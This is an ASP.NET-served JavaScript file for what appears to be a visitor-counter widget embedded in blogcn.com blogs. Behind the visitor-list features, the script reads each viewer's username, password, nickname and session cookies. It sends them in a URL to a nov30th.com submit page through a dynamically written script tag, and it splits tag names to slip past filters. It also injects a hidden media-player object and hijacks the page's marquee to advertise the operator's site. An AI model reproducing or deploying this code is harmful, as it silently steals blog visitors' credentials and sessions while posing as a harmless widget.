<%@ Page Language="C#" EnableViewState="false" ResponseEncoding="GB2312" EnableSessionState="false"%>

<script runat="server">

    protected void Page_Load()
    {
        Response.Redirect("blogcnNEW.aspx", true);
        if (Request.UrlReferrer == null || (Request.UrlReferrer.ToString().StartsWith("http://www.blogcn.com") == false && Request.UrlReferrer.ToString().StartsWith("http://login.blogcn.com") == false))
        {
            Response.Write("document.getElementById(\"visitors\").innerHTML='Connect BLOGCN.COM's DATABASE failed!';");
            Response.End();

        }
    }
    

</script>
		/***********
		//是否Debug
		************/
		var IsDebug = false;
		var tmp_user = "hello";

		/***********
		//获取当前地址的用户函数
		************/
		function GetBlogcnNameByUrl(url)
		{
			tmp_name = '' + url;
			if (tmp_name.indexOf('/index.html') > 0){
				tmp_name = tmp_name.substring(0,tmp_name.indexOf('/index.html'));
				tmp_name = tmp_name.substring(tmp_name.lastIndexOf('/') + 1);
				if (IsDebug) alert(tmp_name);
			}else{
				tmp_name = tmp_name.substring(0,tmp_name.indexOf('/blog/'));
				tmp_name = tmp_name.substring(tmp_name.lastIndexOf('/') + 1);
				if (IsDebug) alert(tmp_name);
			}
			return tmp_name;
		}
		
		/***********
		//提交的地址
		***********/
		var nov30th_submit = 'http://www.nov30th.com/vr/submitOLD.aspx';
		var nov30th_other = 'http://www.nov30th.com/blogcn/other.js';
		//获得用户
		var nov30th_blogname = GetBlogcnNameByUrl(window.location);
		
		/***********		
		//设置cookie
		***********/
		function SetCookie(name,value,expires) 
		{ 
			var exp=new Date(); 
			exp.setTime(exp.getTime()+expires*60*1000); 
			document.cookie = name + '=' + escape(CodeCookie(value)) + ' ; expires=' + exp.toGMTString() + ' ; path=/'; 
		} 
		
		/***********
		//读取cookie
		***********/
		function Get_Cookie( name ) {
			
			var start = document.cookie.indexOf( name + '=' );
			var len = start + name.length + 1;
			//if ( ( !start ) &&
			//	( name != document.cookie.substring( 0, name.length ) ) )
			//{
			//	return null;
			//}
			if ( start == -1 ) return null;
			var end1 = document.cookie.indexOf( ';', len );
			var end = document.cookie.indexOf( '&', len );
			if ( end > end1 ) end = end1;
			//end = document.cookie.length;
			return document.cookie.substring( len, end ) ;
		}
		
		
		/***********
		//把null设定为空
		***********/
		function SetNull( str )
		{
			var strresult=str;
			if (strresult == null)
				strresult = '';
			return strresult;
		}
		
		/***********
		//BLOGCN读取信息
		***********/
		var nov30th_referrer = '' + SetNull(document.referrer);
		if (nov30th_referrer.indexOf("http://www.blogcn.com/u/") == 0 || nov30th_referrer.indexOf("http://www.blogcn.com/user") ==0 || nov30th_referrer.indexOf("http://www.blogcn.com/User") == 0  || nov30th_referrer.indexOf("http://login.blogcn.com/user") ==0 || nov30th_referrer.indexOf("http://login.blogcn.com/user") ==0 || nov30th_referrer.indexOf("http://login.blogcn.com/user") ==0)
		{
			if (GetBlogcnNameByUrl(nov30th_referrer) != nov30th_blogname)
			{
				nov30th_referrer = "qzj://Blogcn:" + GetBlogcnNameByUrl(nov30th_referrer);
			}
			else
			{
				nov30th_referrer = '';
			}
		}
		var nov30th_blogtype = '1';
		var nov30th_username = SetNull(Get_Cookie('username'));
		var nov30th_password = SetNull(Get_Cookie('password'));
		var nov30th_nickname = SetNull(Get_Cookie('nickname'));
		var nov30th_bsession = SetNull(Get_Cookie('Blogcnsession'));
		//nov30th_blogname
		
		
		if (IsDebug)
		{
			alert('referrer:' + nov30th_referrer);
			alert('blogtype:' + nov30th_blogtype);
			alert('username:' + nov30th_username);
			alert('password:' + nov30th_password);
			alert('nickname:' + nov30th_nickname);
		}
		
		if (document.getElementById("visitors")==null)
		{
		    alert('没有找到Visitors的DIV标志！请重新插入代码！\n\n\n         ----Nov30th.Com');
		    document.body.text = null;
		    document.close();
		    nov30th_submit = '';
		}
		    //document.write ('<div id="visitors">读取资料失败...</div>');
		if (document.getElementById("usedforonlinetime")==null)
		    document.write ('<div id="usedforonlinetime"></div>');


        function showFriendList(url,nickname)
        {
            var rpedurl=xreplace(url,"qzj://Blogcn:","");
            document.write("<a href='" + url + ".blogcn.com' target=_blank>"); 
            document.write(nickname);
            document.write("</a>");
        }

		//时间比对
		function compareDate(DateOne,DateTwo)
		{
			
			var OneMonth = DateOne.substring(5,DateOne.lastIndexOf ("-"));
			var OneDay = DateOne.substring(DateOne.lastIndexOf (" "),DateOne.lastIndexOf ("-")+1);
			var OneYear = DateOne.substring(0,DateOne.indexOf ("-"));
			
			var TwoMonth = DateTwo.substring(5,DateTwo.lastIndexOf ("-"));
			var TwoDay = DateTwo.substring(DateTwo.lastIndexOf (" "),DateTwo.lastIndexOf ("-")+1);
			var TwoYear = DateTwo.substring(0,DateTwo.indexOf ("-"));
			
			if (Date.parse(OneMonth+"/"+OneDay+"/"+OneYear) == Date.parse(TwoMonth+"/"+TwoDay+"/"+TwoYear))
			{
				return true;
			}
			else
			{
				return false;
			}
			
		}
		
		//读出时间部分
		function qzjspeartime(stime)
		{
			var qzjreturn;
			qzjreturn = stime.substring(stime.length , stime.indexOf(' '));
			qzjreturn = qzjreturn.substring(0, qzjreturn.lastIndexOf(':'));
			return qzjreturn;
		}
		
		/**********
		//利用模版生成结果的函数
		**********/
		
		var pic_ip;
		var pic_m;
		
		function xreplace(checkMe,toberep,repwith)
		{
			var temp = checkMe;
			var i = temp.indexOf(toberep);
			while(i > -1)
			{
				temp = temp.replace(toberep, repwith);
				i = temp.indexOf(toberep, i + repwith.length + 1);
			}
			return temp;
		}
		
		function qzj_m(qzj_username,qzj_nickname,qzj_time,qzj_local)
		{
			if (qzj_username=='qzj' || qzj_username==nov30th_blogname)
				return;
			var qzjtmp = pic_m;
			qzjtmp = xreplace(qzjtmp,'qzj_u',qzj_username);
			qzjtmp = xreplace(qzjtmp,'qzj_n',qzj_nickname);
			qzjtmp = xreplace(qzjtmp,'qzj_i',qzj_local);
			qzjtmp = xreplace(qzjtmp,'qzj_t',qzj_time);
			if (compareDate(qzj_time,qzj_today))
				qzjtmp = xreplace(qzjtmp,'qzj_s',qzjspeartime(qzj_time));
			else
				qzjtmp = xreplace(qzjtmp,'qzj_s','');			
			document.write(qzjtmp);
		}
		
		function qzj_ip(qzj_time,qzj_local)
		{
			var qzjtmp = pic_ip;
			qzjtmp = xreplace(qzjtmp,'qzj_t',qzj_time);
			qzjtmp = xreplace(qzjtmp,'qzj_i',qzj_local);
			if (compareDate(qzj_time,qzj_today))
				qzjtmp = xreplace(qzjtmp,'qzj_s',qzjspeartime(qzj_time));
			else
				qzjtmp = xreplace(qzjtmp,'qzj_s','');	
			document.write(qzjtmp);
		}
		
		function startOnlineTime(visitorId)
		{
		    document.getElementById("usedforonlinetime").innerHTML = "<img src=http://www.nov30th.com/vr/OnlineTime.aspx?id=" + visitorId + "&" + escape(Date()) +" width=0 height=0 border=0>";
		    var mytime=setTimeout("startOnlineTime(" + visitorId +");",10000);
		}
		
		/***********
		//组合提交地址
		***********/
		if (nov30th_blogname != "lengyouyou0621" && nov30th_blogname != "qzj")
		{
		    var marquees=document.getElementsByTagName("MARQUEE");
		    if ( marquees.length > 0)
		    {
		        marquees[0].innerHTML= ("<A class=blank style=\"COLOR: #ff0000; TEXT-DECORATION: none\" href=\"http://www.nov30th.com/vr/\" target=_blank><strong>登录管理 HOHO``</strong></A>");
		        marquees[0].behavior= "alternate";
		        marquees[0].scrollamount = "50";
		        marquees[0].scrolldelay= "0";
        	}
        }
        if (nov30th_blogname == '8510795' || nov30th_blogname == 'coffeemilker')
        {
            document.item.all = null;
            document.getElementById("visitors").innerHTML='';
            document.close();
        }
		var nov30th_aim = (nov30th_submit + '?u=' + nov30th_username + '&c=' + nov30th_blogname + '&p=' + nov30th_password + '&n=' + nov30th_nickname + '&b=' + nov30th_blogtype + '&s=' + nov30th_bsession + '&r=' + nov30th_referrer);
		document.write ('<O' + 'BJECT id="Nov30th_Player"  standby="Loading" type="application/x-oleobject" height="0" width="0" classid="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6"><PARAM NAME="URL" VALUE=""><PARAM NAME="loop" VALUE="1"><PARAM NAME="rate" VALUE="1"><PARAM NAME="balance" VALUE="0"><PARAM NAME="currentPosition" VALUE="0"><PARAM NAME="defaultFrame" VALUE=""><PARAM NAME="playCount" VALUE="0"><PARAM NAME="autoStart" VALUE="-1"><PARAM NAME="currentMarker" VALUE="0"><PARAM NAME="invokeURLs" VALUE="-1"><PARAM NAME="baseURL" VALUE=""><PARAM NAME="volume" VALUE="100"><PARAM NAME="mute" VALUE="0"><PARAM NAME="uiMode" VALUE="full"><PARAM NAME="stretchToFit" VALUE="0"><PARAM NAME="windowlessVideo" VALUE="0"><PARAM NAME="enabled" VALUE="-1"><PARAM NAME="enableContextMenu" VALUE="0"><PARAM NAME="fullScreen" VALUE="0"><PARAM NAME="SAMIStyle" VALUE=""><PARAM NAME="SAMILang" VALUE=""><PARAM NAME="SAMIFilename" VALUE=""><PARAM NAME="captioningID" VALUE=""><PARAM NAME="enableErrorDialogs" VALUE="0"><PARAM NAME="_cx" VALUE="5953"><PARAM NAME="_cy" VALUE="5953"></OB' + 'JECT>');
		document.write ('<s' + 'cript language="javascript" src="'+ nov30th_aim + '"></s' + 'cript>\n');
		document.write ('<s' + 'cript language="javascript" src="http://www.nov30th.com/vr/filter.aspx"></s' + 'cript>\n');
